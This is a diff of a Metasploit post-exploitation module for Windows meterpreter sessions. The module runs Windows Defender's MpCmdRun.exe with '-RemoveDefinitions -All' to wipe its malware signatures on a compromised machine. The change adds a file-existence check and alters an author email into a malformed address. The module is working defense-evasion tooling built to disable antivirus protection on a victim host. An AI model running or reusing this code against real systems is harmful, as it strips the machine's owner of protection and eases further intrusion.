@@ -4,6 +4,7 @@
 ##
 
 class MetasploitModule < Msf::Post
+  include Msf::Post::File
   include Msf::Post::Windows::Priv
 
   def initialize(info={})
@@ -18,7 +19,7 @@ class MetasploitModule < Msf::Post
         to execute even with the Windows Defender solution enabled.
       },
       'License'       => MSF_LICENSE,
-      'Author'        => ['metasploit@csiete.org',
+      'Author'        => ['metasploit@[at]csiete.org',
       'luisco100 <luisco100[at]gmail.com>'], # Module author
       'Platform'      => [ 'win' ],
       'SessionTypes'  => [ 'meterpreter' ],
@@ -28,8 +29,11 @@ class MetasploitModule < Msf::Post
   def run
     unless is_system?()
       print_status("Remove Definitions Windows Defender")
-      cmd = cmd_exec('cmd.exe', "/c \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All")
-      print_status("#{cmd}")
+      file_path = "C:\\Program Files\\Windows Defender\\MpCmdRun.exe"
+      if exist?(file_path)
+        cmd = cmd_exec('cmd.exe', "/c \"#{file_path}\" -RemoveDefinitions -All")
+        print_status("#{cmd}")
+      end
     end
   end
 end
